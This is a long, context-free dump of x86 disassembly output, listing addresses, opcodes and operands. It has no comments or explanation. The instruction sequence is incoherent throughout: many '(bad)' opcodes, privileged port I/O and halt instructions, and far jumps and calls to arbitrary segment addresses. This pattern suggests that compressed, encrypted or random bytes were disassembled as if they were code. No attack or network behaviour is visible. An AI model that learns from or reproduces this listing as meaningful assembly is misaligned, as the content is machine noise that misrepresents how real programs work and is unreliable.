  41cc61:	lea    edi,[ebx+ecx*1-0x4eebf59a]
  41cc68:	push   cs
  41cc69:	scas   al,BYTE PTR es:[edi]
  41cc6a:	sub    DWORD PTR [ebx+0x29],0xffffffa9
  41cc6e:	sti    
  41cc6f:	(bad)  
  41cc70:	fdiv   DWORD PTR [edx]
  41cc72:	fs pop edi
  41cc74:	test   DWORD PTR [ecx],edi
  41cc76:	ja     0x41ccd1
  41cc78:	mov    ebx,0x381beb29
  41cc7d:	mov    eax,0x774c4a7
  41cc82:	inc    dh
  41cc84:	jns    0x99966d07
  41cc8a:	(bad)  
  41cc8b:	mul    esp
  41cc8d:	or     DWORD PTR [esi-0x24],0xa3f0c21c
  41cc94:	cmp    BYTE PTR [ebx+0x30ead547],cl
  41cc9a:	adc    esi,DWORD PTR [ecx]
  41cc9c:	pop    edi
  41cc9d:	push   edi
  41cc9e:	pusha  
  41cc9f:	inc    edi
  41cca0:	(bad)  
  41cca1:	xor    edx,DWORD PTR [eax-0x329cb1f3]
  41cca7:	ss repnz mov ch,0xc5
  41ccab:	loope  0x41ccfd
  41ccad:	pop    ebp
  41ccae:	inc    edi
  41ccaf:	mov    al,0x66
  41ccb1:	sub    eax,0x2cfdd060
  41ccb6:	fnstsw WORD PTR [ebp-0x3812006c]
  41ccbc:	les    ebp,FWORD PTR [edx+ebx*8+0x6e]
  41ccc0:	and    eax,0x18c2e8bc
  41ccc5:	xor    ecx,DWORD PTR [edx-0x52]
  41ccc8:	out    dx,al
  41ccc9:	inc    edx
  41ccca:	mov    eax,0xff653fbf
  41cccf:	lods   eax,DWORD PTR ds:[esi]
  41ccd0:	sbb    esi,0xc4fb16e3
  41ccd6:	test   eax,0xfc851fe4
  41ccdb:	adc    eax,0x84688126
  41cce0:	mov    eax,ds:0x57e789f9
  41cce5:	pop    edi
  41cce6:	pop    esp
  41cce7:	lods   eax,DWORD PTR ds:[esi]
  41cce8:	sbb    eax,0xa0dd257c
  41cced:	push   0xc105637f
  41ccf2:	pop    eax
  41ccf3:	or     bl,BYTE PTR [ebx+esi*4-0x32bb2b07]
  41ccfa:	test   DWORD PTR [edi],edx
  41ccfc:	pop    esi
  41ccfd:	jmp    0xfaef:0x117426a9
  41cd04:	data16 sahf 
  41cd06:	stos   DWORD PTR es:[edi],eax
  41cd07:	sub    al,0x80
  41cd09:	sbb    ecx,ebp
  41cd0b:	inc    esi
  41cd0c:	adc    eax,0xade968f3
  41cd11:	and    BYTE PTR [ebx+0x3b],dl
  41cd14:	std    
  41cd15:	in     eax,dx
  41cd16:	ds cmc 
  41cd18:	mov    edi,0xf6769760
  41cd1d:	aas    
  41cd1e:	add    DWORD PTR [edx],esi
  41cd20:	lods   al,BYTE PTR ds:[esi]
  41cd21:	hlt    
  41cd22:	add    DWORD PTR [esi+0x0],edx
  41cd25:	int3   
  41cd26:	xchg   ecx,eax
  41cd27:	cmp    DWORD PTR [ecx-0x2c],edx
  41cd2a:	jge    0x41ccfd
  41cd2c:	mov    ah,0x53
  41cd2e:	and    al,0xd
  41cd30:	sbb    eax,DWORD PTR [edi+ecx*1+0x5c50df44]
  41cd37:	inc    esi
  41cd38:	push   edi
  41cd39:	dec    edx
  41cd3a:	push   ebx
  41cd3b:	int3   
  41cd3c:	adc    eax,edx
  41cd3e:	retf   0x3678
  41cd41:	or     ecx,DWORD PTR [edx+eiz*4+0x58]
  41cd45:	and    ecx,esi
  41cd47:	cmp    edx,DWORD PTR [edx]
  41cd49:	pop    esp
  41cd4a:	push   ebx
  41cd4b:	aaa    
  41cd4c:	mov    BYTE PTR [esp+ebx*1],0x34
  41cd50:	cmc    
  41cd51:	jbe    0x41cd9b
  41cd53:	jle    0x41cd57
  41cd55:	test   eax,0x633eb808
  41cd5a:	mov    cs,ebx
  41cd5c:	xor    BYTE PTR [ebp-0x1fcb4d61],0x9f
  41cd63:	and    BYTE PTR [edi],0xfb
  41cd66:	xor    eax,0x5b75832f
  41cd6b:	push   0x64d20754
  41cd70:	and    eax,0x32425af1
  41cd75:	mov    bh,BYTE PTR [edx]
  41cd77:	dec    esp
  41cd78:	pop    es
  41cd79:	ja     0x41cd15
  41cd7b:	lea    esi,[esp+eiz*4+0x29]
  41cd7f:	in     eax,dx
  41cd80:	sub    ebx,eax
  41cd82:	mov    ebp,0xb5747ead
  41cd87:	call   0xf09:0x9d9868e4
  41cd8e:	xor    al,0x4d
  41cd90:	(bad)  
  41cd91:	jge    0x41cdb2
  41cd93:	daa    
  41cd94:	or     BYTE PTR [ecx],0x73
  41cd97:	test   al,0x65
  41cd99:	push   0xe8ca3d11
  41cd9e:	sub    ah,BYTE PTR [ebp+0x45ae4f8a]
  41cda4:	cmp    DWORD PTR ds:0xf9e933c3,0x3e24ce94
  41cdae:	mov    eax,0x9c8c1f39
  41cdb3:	xchg   ecx,eax
  41cdb4:	mov    DWORD PTR [eax+ebp*2+0x6f02540e],edx
  41cdbb:	pop    ecx
  41cdbc:	nop
  41cdbd:	popa   
  41cdbe:	ds cli 
  41cdc0:	pop    ebx
  41cdc1:	fnstenv [ebx+0x23946028]
  41cdc7:	sub    DWORD PTR [edi+0xd],0xffffffce
  41cdcb:	fwait
  41cdcc:	mov    dh,BYTE PTR [eax]
  41cdce:	inc    ecx
  41cdcf:	xchg   esp,eax
  41cdd0:	fild   DWORD PTR ds:0x2712c57d
  41cdd6:	cdq    
  41cdd7:	mov    bl,0xe
  41cdd9:	inc    ecx
  41cdda:	mov    edi,0xb24cfd53
  41cddf:	(bad)  
  41cde1:	pop    ebx
  41cde2:	jl     0x41cd84
  41cde4:	adc    bh,BYTE PTR [eax-0x29a9f35d]
  41cdea:	push   ebp
  41cdeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdec:	dec    esi
  41cded:	imul   edx,DWORD PTR [edi+ecx*2],0x23f3f156
  41cdf4:	add    ah,cl
  41cdf6:	mov    bh,BYTE PTR [edi-0xc]
  41cdf9:	pop    ds
  41cdfa:	fcmovnu st,st(2)
  41cdfc:	iret   
  41cdfd:	mov    dh,0xfe
  41cdff:	inc    edi
  41ce00:	add    DWORD PTR [edi+0x2cb92bd3],edx
  41ce06:	cmp    al,0x24
  41ce08:	imul   ebp,DWORD PTR [edx-0x23],0xffffffcf
  41ce0c:	scas   al,BYTE PTR es:[edi]
  41ce0d:	mov    eax,ds:0x82f3d411
  41ce12:	or     BYTE PTR [ebp+0x37238a73],bl
  41ce18:	cmp    DWORD PTR [ebx+ecx*1-0x6d8850d5],edx
  41ce1f:	mov    dl,0xec
  41ce21:	sub    DWORD PTR [edi+0x3e0e8510],eax
  41ce27:	dec    edx
  41ce28:	add    BYTE PTR [edi],cl
  41ce2a:	jno    0x41ce0c
  41ce2c:	fistp  QWORD PTR [esi+0x79ebb65b]
  41ce32:	hlt    
  41ce33:	mov    bh,0xcc
  41ce35:	jb     0x41ce6c
  41ce37:	or     ebx,DWORD PTR [esi-0x6c469f76]
  41ce3d:	mov    al,ds:0x49c059fb
  41ce42:	pop    edi
  41ce43:	add    BYTE PTR [eax+0x4cf2cbd2],ah
  41ce49:	fdiv   DWORD PTR [edx+0x71]
  41ce4c:	pop    eax
  41ce4d:	pop    edi
  41ce4e:	push   eax
  41ce4f:	sbb    DWORD PTR [ebp-0x687a8e89],esp
  41ce55:	rol    cl,cl
  41ce57:	inc    edx
  41ce58:	imul   esi,DWORD PTR [eax],0x28b06610
  41ce5e:	arpl   WORD PTR [eax+0x6d],ax
  41ce61:	jnp    0x41ce89
  41ce63:	or     BYTE PTR [ecx],0x9f
  41ce66:	sbb    eax,0x2e5c1ccd
  41ce6b:	cli    
  41ce6c:	xchg   edx,eax
  41ce6d:	or     al,dl
  41ce6f:	jp     0x41cdfa
  41ce71:	inc    ecx
  41ce72:	mov    ah,0x48
  41ce74:	nop
  41ce75:	ja     0x41ced2
  41ce77:	stos   DWORD PTR es:[edi],eax
  41ce78:	cmp    dl,BYTE PTR [ebp+0x639b16d0]
  41ce7e:	bsf    eax,DWORD PTR [ebp-0x3273]
  41ce85:	test   ebx,0x90a821f6
  41ce8b:	jecxz  0x41ce3c
  41ce8d:	ficom  WORD PTR [edi+0xdc8cb0a]
  41ce93:	and    esi,DWORD PTR [ebp-0x155fadd2]
  41ce99:	pop    edi
  41ce9a:	pop    edi
  41ce9b:	test   DWORD PTR [esi+eiz*2+0x1e],eax
  41ce9f:	lea    edx,[edi+0x682c0d80]
  41cea5:	out    0xc0,eax
  41cea7:	js     0x41ce95
  41cea9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41ceab:	cmp    ch,0x5
  41ceae:	mov    eax,0x2aad5dc5
  41ceb3:	push   es
  41ceb4:	imul   edi,ebx,0xffffffdf
  41ceb7:	mov    ecx,0x158508dd
  41cebc:	jg     0x41ce68
  41cebe:	test   eax,0x696a940b
  41cec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cec4:	jg     0x41ce8d
  41cec6:	jbe    0x41ce92
  41cec8:	or     BYTE PTR [ecx-0x62],0xab
  41cecc:	into   
  41cecd:	int3   
  41cece:	add    DWORD PTR [ebp-0x40],edi
  41ced1:	dec    esi
  41ced2:	inc    ebx
  41ced3:	jb     0x41cf01
  41ced5:	cmp    al,BYTE PTR gs:0x8fb7fd
  41cedc:	ins    DWORD PTR es:[edi],dx
  41cedd:	movhps QWORD PTR [esi-0x9],xmm5
  41cee1:	or     al,0x54
  41cee3:	cli    
  41cee4:	test   eax,0x25a0566b
  41cee9:	sub    BYTE PTR [ebp+0x4c],0x90
  41ceed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceee:	into   
  41ceef:	stos   BYTE PTR es:[edi],al
  41cef0:	shl    ebx,cl
  41cef2:	jns    0x41cf67
  41cef4:	cdq    
  41cef5:	push   es
  41cef6:	cwde   
  41cef7:	adc    bh,BYTE PTR [edx]
  41cef9:	dec    ebx
  41cefa:	lahf   
  41cefb:	inc    DWORD PTR [eax-0x76]
  41cefe:	xor    DWORD PTR [ecx-0x4301404c],edi
  41cf04:	xchg   edi,eax
  41cf05:	xor    eax,DWORD PTR [ebx]
  41cf07:	mov    ecx,?
  41cf09:	cmp    cl,BYTE PTR [ebx-0x14]
  41cf0c:	je     0x41cf1d
  41cf0e:	push   ebx
  41cf0f:	dec    ebp
  41cf10:	inc    esp
  41cf11:	xchg   ebx,eax
  41cf12:	imul   eax,DWORD PTR [edi+0x66],0x3270a4aa
  41cf19:	xchg   ecx,eax
  41cf1a:	shl    DWORD PTR [ebx+0xd],cl
  41cf1d:	adc    dh,0xd5
  41cf20:	bound  eax,QWORD PTR [eax-0x77]
  41cf23:	mov    edi,0x62b47404
  41cf28:	mov    bl,0x48
  41cf2a:	loope  0x41cf7b
  41cf2c:	sub    al,0x86
  41cf2e:	fmul   QWORD PTR [ebp-0x475d58ef]
  41cf34:	dec    BYTE PTR [ebx+0x1c9ad627]
  41cf3a:	sbb    al,0x11
  41cf3c:	push   ebp
  41cf3d:	test   eax,0xee38773e
  41cf42:	mov    dl,0x2c
  41cf44:	sub    BYTE PTR [edi+0x317fe509],bl
  41cf4a:	pop    ecx
  41cf4b:	push   ecx
  41cf4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf4d:	xor    eax,0xda7bcb16
  41cf52:	jge    0x41cf0a
  41cf54:	sub    BYTE PTR [esi+0x3a],cl
  41cf57:	shl    BYTE PTR [edi],0xa6
  41cf5a:	push   ds
  41cf5b:	(bad)  
  41cf5c:	jge    0x41cefa
  41cf5e:	arpl   WORD PTR [esi-0x2d],si
  41cf61:	leave  
  41cf62:	pop    edi
  41cf63:	int3   
  41cf64:	jle    0x41cef7
  41cf66:	rcr    DWORD PTR [ecx],cl
  41cf68:	iret   
  41cf69:	jle    0x41cf6e
  41cf6b:	out    dx,eax
  41cf6c:	and    ah,0xc1
  41cf6f:	ret    
  41cf70:	mov    ds:0x9f398430,al
  41cf75:	and    DWORD PTR [esi+0x44],ebx
  41cf78:	(bad)  
  41cf79:	add    DWORD PTR [esi-0x33],0xffffffa0
  41cf7d:	push   ecx
  41cf7e:	shl    DWORD PTR [esi-0x17],cl
  41cf81:	in     eax,dx
  41cf82:	imul   esi,DWORD PTR [edx],0x2d5a6e26
  41cf88:	mov    esi,0xf66bc632
  41cf8d:	push   ds
  41cf8e:	int3   
  41cf8f:	sub    BYTE PTR [ebp+0x5cf18e02],dh
  41cf95:	cwde   
  41cf96:	ret    
  41cf97:	xchg   esi,eax
  41cf98:	or     eax,0x4a65d297
  41cf9d:	dec    ecx
  41cf9e:	adc    dh,ch
  41cfa0:	retf   
  41cfa1:	cmp    DWORD PTR [ecx+eax*1+0x7a],0x4eaeb455
  41cfa9:	xchg   ecx,eax
  41cfaa:	jg     0x41d025
  41cfac:	xchg   edi,eax
	...
  41d181:	jecxz  0x41d189
  41d183:	add    DWORD PTR [edi-0x1b],esi
  41d186:	ja     0x41d17f
  41d188:	xchg   esi,eax
  41d189:	popf   
  41d18a:	mov    edx,0x469ac648
  41d18f:	test   BYTE PTR [ecx-0x3a],dl
  41d192:	test   eax,0x7250001
  41d197:	add    BYTE PTR [eax],al
  41d199:	cmc    
  41d19a:	jl     0x41d1bb
  41d19c:	ret    0x6a3f
  41d19f:	dec    ebp
  41d1a0:	ds (bad) 
  41d1a2:	pop    ds
  41d1a3:	fucomp st(5)
  41d1a5:	inc    edx
  41d1a6:	ret    
  41d1a7:	xchg   edx,eax
  41d1a8:	out    dx,al
  41d1a9:	(bad)  
  41d1aa:	dec    ecx
  41d1ab:	scas   eax,DWORD PTR es:[edi]
  41d1ac:	sbb    al,0x6d
  41d1ae:	ds popf 
  41d1b0:	les    esp,FWORD PTR [eax+edx*1]
  41d1b3:	push   es
  41d1b4:	fcom   DWORD PTR [eax-0x69deabbe]
  41d1ba:	shr    BYTE PTR [edx-0x6],cl
  41d1bd:	pop    es
  41d1be:	and    ebp,ecx
  41d1c0:	imul   edx,DWORD PTR [edx+0xa6a0b63],0xffffff84
  41d1c7:	je     0x41d21c
  41d1c9:	std    
  41d1ca:	iret   
  41d1cb:	rcr    dh,0x80
  41d1ce:	xor    eax,0x40eaf657
  41d1d3:	pop    ds
  41d1d4:	adc    cl,bh
  41d1d6:	cmp    al,BYTE PTR [eax]
  41d1d8:	loope  0x41d241
  41d1da:	shl    BYTE PTR [edi+0x2a0c85b4],0xf2
  41d1e1:	sbb    eax,0xde341538
  41d1e6:	xor    dl,BYTE PTR [esi]
  41d1e8:	adc    DWORD PTR [edx],esi
  41d1ea:	data16 mov WORD PTR [ebx+ebx*1+0x1b],gs
  41d1ef:	pop    edi
  41d1f0:	sub    al,0xf5
  41d1f2:	rcl    BYTE PTR [edi],1
  41d1f4:	push   esi
  41d1f5:	out    dx,al
  41d1f6:	fnstsw WORD PTR ds:0x3662ae0d
  41d1fc:	ins    BYTE PTR es:[edi],dx
  41d1fd:	jecxz  0x41d23e
  41d1ff:	dec    ebx
  41d200:	ins    DWORD PTR es:[edi],dx
  41d201:	popa   
  41d202:	mov    ecx,0x5b44b5ef
  41d207:	mov    ecx,DWORD PTR [ecx]
  41d209:	jbe    0x41d24e
  41d20b:	das    
  41d20c:	(bad)  
  41d20d:	fwait
  41d20e:	jnp    0x41d199
  41d210:	xchg   esp,eax
  41d211:	arpl   WORD PTR [eax-0x2ad58b4c],di
  41d217:	xchg   esi,eax
  41d218:	push   0x7003b018
  41d21d:	lods   eax,DWORD PTR ds:[esi]
  41d21e:	sub    al,0x1b
  41d220:	rol    DWORD PTR [ecx-0x32dc5dc5],1
  41d226:	lfs    edi,FWORD PTR ds:[ebx+0x3f]
  41d22b:	das    
  41d22c:	dec    edx
  41d22d:	jmp    0x41d245
  41d22f:	xor    dl,BYTE PTR [ebx-0x79936727]
  41d235:	pop    ecx
  41d236:	aaa    
  41d237:	adc    eax,DWORD PTR [edx]
  41d239:	pushf  
  41d23a:	sbb    al,0x8e
  41d23c:	and    BYTE PTR [edi+0x60543c35],ch
  41d242:	xchg   BYTE PTR [edx],dl
  41d244:	in     eax,0x21
  41d246:	js     0x41d20f
  41d248:	mov    ecx,0xde7e243a
  41d24d:	ret    0x20e1
  41d250:	mov    bl,0x8f
  41d252:	fnsave [esi]
  41d254:	cdq    
  41d255:	add    al,0xdf
  41d257:	mov    ebp,es
  41d259:	sbb    eax,DWORD PTR [eax]
  41d25b:	std    
  41d25c:	xlat   BYTE PTR ds:[ebx]
  41d25d:	fs retf 
  41d25f:	fisub  WORD PTR [edi]
  41d261:	pop    edx
  41d262:	dec    edx
  41d263:	sub    ah,BYTE PTR [eax]
  41d265:	mov    esi,DWORD PTR [ebx+ebx*1-0xe]
  41d269:	push   ebp
  41d26a:	dec    eax
  41d26b:	retf   
  41d26c:	xor    cl,0xc9
  41d26f:	or     BYTE PTR [esi+0x9958429],al
  41d275:	pop    es
  41d276:	jmp    0xb38932a3
  41d27b:	jl     0x41d240
  41d27d:	fidiv  DWORD PTR [ecx-0xe36ce90]
  41d283:	pop    cx
  41d285:	mov    eax,ds:0xbdce2fc9
  41d28a:	fwait
  41d28b:	push   cs
  41d28c:	ins    DWORD PTR es:[edi],dx
  41d28d:	test   al,0x50
  41d28f:	cmp    DWORD PTR [esi+eiz*4+0x1f4963d1],esp
  41d296:	nop
  41d297:	ins    BYTE PTR es:[edi],dx
  41d298:	data16 rcr BYTE PTR [eax],cl
  41d29b:	aad    0x30
  41d29d:	fwait
  41d29e:	jb     0x41d282
  41d2a0:	out    0xe3,eax
  41d2a2:	enter  0x4db4,0xc7
  41d2a6:	pop    ebx
  41d2a7:	scas   eax,DWORD PTR es:[edi]
  41d2a8:	dec    esp
  41d2a9:	cmp    al,0x84
  41d2ab:	mov    edx,0x8627ad97
  41d2b0:	(bad)  [eax-0x3df752a6]
  41d2b6:	js     0x41d2c2
  41d2b8:	cmp    dh,BYTE PTR [edx]
  41d2ba:	into   
  41d2bb:	pushf  
  41d2bc:	push   0x16
  41d2be:	pop    ebp
  41d2bf:	pop    eax
  41d2c0:	shl    DWORD PTR [ebx-0x6f6eafad],1
  41d2c6:	dec    esi
  41d2c7:	repz xchg ebx,eax
  41d2ca:	dec    esp
  41d2cb:	sbb    DWORD PTR ds:0x38584cb5,esi
  41d2d1:	ret    
  41d2d2:	mov    edi,0x51b51053
  41d2d7:	gs push edx
  41d2d9:	push   cs
  41d2da:	mov    DWORD PTR [esi],esp
  41d2dc:	aam    0xbf
  41d2de:	ficomp DWORD PTR [edi-0x3d1235e8]
  41d2e4:	int    0xa0
  41d2e6:	cmp    ecx,DWORD PTR [edi]
  41d2e8:	jne    0x41d309
  41d2ea:	cmp    DWORD PTR [ecx-0xec92550],ecx
  41d2f0:	loop   0x41d362
  41d2f2:	scas   al,BYTE PTR es:[edi]
  41d2f3:	ja     0x41d281
  41d2f5:	dec    esi
  41d2f6:	cmp    bl,BYTE PTR [bp-0x2d]
  41d2fa:	scas   eax,DWORD PTR es:[edi]
  41d2fb:	repz mov al,0x78
  41d2fe:	push   eax
  41d2ff:	out    dx,al
  41d300:	outs   dx,DWORD PTR ds:[esi]
  41d301:	push   ds
  41d302:	pop    eax
  41d303:	rol    BYTE PTR [ebx+0x16365396],cl
  41d309:	je     0x41d293
  41d30b:	pop    edi
  41d30c:	loop   0x41d32d
  41d30e:	(bad)  
  41d30f:	into   
  41d310:	repz repz icebp 
  41d313:	jp     0x41d381
  41d315:	out    dx,eax
  41d316:	stos   DWORD PTR es:[edi],eax
  41d317:	popa   
  41d318:	int3   
  41d319:	jne    0x41d342
  41d31b:	mov    ds:0xf4cb725f,al
  41d320:	aaa    
  41d321:	pop    ss
  41d322:	inc    edx
  41d323:	xchg   BYTE PTR [esi+0x177e8f8f],ah
  41d329:	ficomp DWORD PTR [esi+0x11]
  41d32c:	add    ah,dh
  41d32e:	adc    eax,0xc27adea0
  41d333:	(bad)
  41d336:	adc    eax,0x5a36d0d1
  41d33b:	ins    BYTE PTR es:[edi],dx
  41d33c:	retf   0x2990
  41d33f:	mov    eax,ds:0xdaf83642
  41d344:	in     eax,dx
  41d345:	mov    ah,0xca
  41d347:	fstp   DWORD PTR [ecx+0x2f]
  41d34a:	fisubr WORD PTR [esi+0x424755ae]
  41d350:	mov    edx,DWORD PTR [ebx+0x2c]
  41d353:	dec    esi
  41d354:	add    BYTE PTR [ebx-0x1c6920af],ch
  41d35a:	aad    0x55
  41d35c:	inc    edi
  41d35d:	ficom  WORD PTR [esp+ebx*4]
  41d360:	xchg   ebp,eax
  41d361:	cs out dx,eax
  41d363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d364:	xlat   BYTE PTR ds:[ebx]
  41d365:	sub    ch,BYTE PTR [ebx]
  41d367:	sbb    al,0x25
  41d369:	push   es
  41d36a:	loopne 0x41d356
  41d36c:	out    0x9f,eax
  41d36e:	test   eax,0x58cd43b5
  41d373:	and    dl,BYTE PTR [edi-0x4ee2a84a]
  41d379:	cmp    esp,esi
  41d37b:	xchg   ebp,eax
  41d37c:	cmp    esi,edi
  41d37e:	mov    ecx,0x13097764
  41d383:	sahf   
  41d384:	push   es
  41d385:	pop    esi
  41d386:	jne    0x41d3c9
  41d388:	or     al,0xd8
  41d38a:	sub    eax,0x3d1fea7c
  41d38f:	mov    dl,BYTE PTR [edx+0x15]
  41d392:	add    eax,0x6ab59e66
  41d397:	and    al,BYTE PTR fs:[ebx-0x6865d24c]
  41d39e:	in     al,dx
  41d39f:	mov    eax,0xcb01d252
  41d3a4:	push   edi
  41d3a5:	pop    ecx
  41d3a6:	add    DWORD PTR [ecx],ebx
  41d3a8:	shl    DWORD PTR [ecx],1
  41d3aa:	sbb    cl,BYTE PTR [edi+0x108ff0e2]
  41d3b0:	mov    edi,0xc1a94079
  41d3b5:	iret   
  41d3b6:	lods   eax,DWORD PTR ds:[esi]
  41d3b7:	and    edx,esi
  41d3b9:	or     edx,DWORD PTR [eax+0x55bff3de]
  41d3bf:	jmp    0xe44c73ed
  41d3c4:	jecxz  0x41d34e
  41d3c6:	mov    edi,DWORD PTR [ecx+0x39]
  41d3c9:	ss sahf 
  41d3cb:	mov    cl,0x3e
  41d3cd:	xor    ecx,DWORD PTR [ebp-0x1d]
  41d3d0:	sub    BYTE PTR ss:0x67983a13,cl
  41d3d7:	mov    esp,0x8b13121
  41d3dc:	mov    ds:0x1639c28e,al
  41d3e1:	adc    al,0x91
  41d3e3:	push   esi
  41d3e4:	xchg   esi,ebx
  41d3e6:	dec    eax
  41d3e7:	daa    
  41d3e8:	call   0xb76d:0xd89968ca
  41d3ef:	mov    bl,0xfc
  41d3f1:	je     0x41d3a4
  41d3f3:	cmc    
  41d3f4:	jne    0x41d435
  41d3f6:	xor    eax,DWORD PTR [ecx]
  41d3f8:	cld    
  41d3f9:	scas   al,BYTE PTR es:[edi]
  41d3fa:	cmp    BYTE PTR [edi+0x525759e],ah
  41d400:	(bad)  
  41d401:	xor    ebx,DWORD PTR [edi+0x3f7ab46c]
  41d407:	or     ah,dl
  41d409:	ds stos DWORD PTR es:[edi],eax
  41d40b:	cmp    eax,0x2d01766b
  41d410:	scas   eax,DWORD PTR es:[edi]
  41d411:	call   0xe85356d4
  41d416:	fdivrp st(5),st
  41d418:	add    BYTE PTR [edx+edx*1+0x158114c2],ah
  41d41f:	jae    0x41d42e
  41d421:	jo     0x41d48d
  41d423:	jno    0x41d459
  41d425:	mov    bh,cl
  41d427:	popa   
  41d428:	cld    
  41d429:	adc    DWORD PTR [ecx-0x4c163405],ebx
  41d42f:	loope  0x41d490
  41d431:	xchg   esi,eax
  41d432:	jae    0x41d45f
  41d434:	(bad)  
  41d435:	ins    DWORD PTR es:[edi],dx
  41d436:	xor    ah,BYTE PTR [esi+0x2d77332]
  41d43c:	ret    
  41d43d:	xchg   edx,eax
  41d43e:	sub    al,0x1d
  41d440:	sub    ah,BYTE PTR [ebp+0x44d34f3e]
  41d446:	ins    DWORD PTR es:[edi],dx
  41d447:	repnz retf 
  41d449:	in     al,0xf0
  41d44b:	pop    esp
  41d44c:	mov    bh,0xf4
  41d44e:	test   BYTE PTR ds:0xd3f4590,dh
  41d454:	cld    
  41d455:	pop    DWORD PTR [eax+0xc861d3b]
  41d45b:	ret    
  41d45c:	xor    DWORD PTR [esp+edx*2-0x35],0x890e99dd
  41d464:	sub    dh,bl
  41d466:	shr    dh,1
  41d468:	popa   
  41d469:	dec    ebp
  41d46a:	sub    eax,DWORD PTR [esi-0x6f1d2346]
  41d470:	inc    esi
  41d471:	ror    DWORD PTR [eax-0x2f],cl
  41d474:	adc    DWORD PTR [ebp-0x5b84f8],edx
  41d47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d47b:	mov    ecx,esi
  41d47d:	lds    edx,FWORD PTR [ecx-0x66]
  41d480:	xchg   DWORD PTR [edx+edi*1],esp
  41d483:	push   edx
  41d484:	mov    edx,0x589a6205
  41d489:	push   edi
  41d48a:	lahf   
  41d48b:	xchg   edx,eax
  41d48c:	mov    cl,0x2a
  41d48e:	out    dx,eax
  41d48f:	pusha  
  41d490:	dec    edi
  41d491:	mov    bh,0xa6
  41d493:	je     0x41d4d4
  41d495:	xor    eax,0xef4d539d
  41d49a:	add    esp,DWORD PTR [edi+0x11]
  41d49d:	retf   0x1673
  41d4a0:	adc    DWORD PTR [ecx+0x4],eax
  41d4a3:	xor    DWORD PTR [edx],edx
  41d4a5:	ss jp  0x41d4f1
  41d4a8:	mov    ds:0x27bf3dc,al
  41d4ad:	xor    al,bl
  41d4af:	add    eax,0x1f8daa2a
  41d4b4:	mov    edx,0x93dee136
  41d4b9:	push   ecx
  41d4ba:	cmp    DWORD PTR ds:0x86bbba2e,0xffffff9c
  41d4c1:	lock jnp 0x41d520
  41d4c4:	dec    esp
  41d4c5:	jmp    0x22ed:0xbbdca505
  41d4cc:	jmp    0x41d462
  41d4ce:	and    DWORD PTR [eax-0x32],esi
  41d4d1:	push   es
  41d4d2:	xor    dl,0xbc
  41d4d5:	jmp    0x41d4d6
  41d4d7:	rol    DWORD PTR [ecx+0x64],0xfa
  41d4db:	jg     0x41d4fa
  41d4dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4de:	sbb    edi,ebx
  41d4e0:	das    
  41d4e1:	xlat   BYTE PTR ds:[ebx]
  41d4e2:	jmp    0x60252c4d
  41d4e7:	stos   BYTE PTR es:[edi],al
  41d4e8:	jae    0x41d547
  41d4ea:	sub    al,0x50
  41d4ec:	popa   
  41d4ed:	dec    esp
  41d4ee:	call   0xd50a:0x97f1d1d7
  41d4f5:	les    ebp,FWORD PTR [esi-0x66]
  41d4f8:	lods   al,BYTE PTR ds:[esi]
  41d4f9:	stc    
  41d4fa:	fsubp  st(2),st
  41d4fc:	repz es cmp cl,bl
  41d500:	pop    ds
  41d501:	pop    ds
  41d502:	int    0xb3
  41d504:	shl    BYTE PTR [esi+0x18],1
  41d507:	iret   
  41d508:	test   DWORD PTR [esi+0x0],ebx
  41d50b:	bound  ebp,QWORD PTR [eax-0x45f85014]
  41d511:	loopne 0x41d565
  41d513:	push   esp
  41d514:	je     0x41d4c1
  41d516:	dec    eax
  41d517:	fisubr WORD PTR [eax-0x6b]
  41d51a:	mov    ebp,0x35fbdcdc
  41d51f:	mov    ch,0x34
  41d521:	sub    cl,BYTE PTR [eax+0x589c5bbb]
  41d527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d528:	lea    esi,[edx+edi*8+0x1ee8c4e2]
  41d52f:	ret    0xd161
  41d532:	into   
  41d533:	or     DWORD PTR [ebx-0x3e],0xa8ae5500
  41d53a:	popa   
  41d53b:	bsf    ecx,DWORD PTR [ebx-0x7471e6ae]
  41d542:	or     DWORD PTR [esp+edx*8+0x2492eee7],eax
  41d549:	lods   al,BYTE PTR ds:[esi]
  41d54a:	sub    al,0x2
  41d54c:	pop    esp
  41d54d:	or     esi,ecx
  41d54f:	or     dl,BYTE PTR [edi]
  41d551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d552:	out    0xb7,eax
  41d554:	in     al,0x60
  41d556:	in     eax,0xad
  41d558:	mov    eax,0x7b0ff387
  41d55d:	and    eax,DWORD PTR [edi]
  41d55f:	test   DWORD PTR [esi+ecx*1],edx
  41d562:	mov    al,ds:0xe88151ba
  41d567:	add    dl,dh
  41d569:	and    eax,0xc2b4dbcb
  41d56e:	mov    al,ds:0xd975990a
  41d573:	out    0x62,al
  41d575:	in     al,dx
  41d576:	add    DWORD PTR [esi],ecx
  41d578:	push   edi
  41d579:	cmp    al,ah
  41d57b:	sub    ch,bl
  41d57d:	fcmovnbe st,st(6)
  41d57f:	sbb    bh,0x1d
  41d582:	ins    BYTE PTR es:[edi],dx
  41d583:	pop    DWORD PTR ds:0xe0a531f8
  41d589:	repnz sub eax,0x76987b6a
  41d58f:	(bad)  
  41d590:	cmc    
  41d591:	jge    0x41d560
  41d593:	loope  0x41d5a0
  41d595:	pop    ds
  41d596:	retf   
  41d597:	loop   0x41d5a0
  41d599:	and    DWORD PTR ss:[esi-0x1aaf7d2a],eax
  41d5a0:	stos   BYTE PTR es:[edi],al
  41d5a1:	outs   dx,BYTE PTR ds:[esi]
  41d5a2:	pop    ebp
  41d5a3:	adc    BYTE PTR [ecx+0x29],al
  41d5a6:	ror    DWORD PTR [esi],1
  41d5a8:	jb     0x41d5bd
  41d5aa:	jmp    0x41d573
  41d5ac:	(bad)  
  41d5ad:	dec    esi
  41d5ae:	xchg   esp,eax
  41d5af:	fcom   DWORD PTR [edi-0x5ca16442]
  41d5b5:	xor    edx,DWORD PTR [edi+eiz*1]
  41d5b8:	ja     0x41d552
  41d5ba:	jp     0x41d616
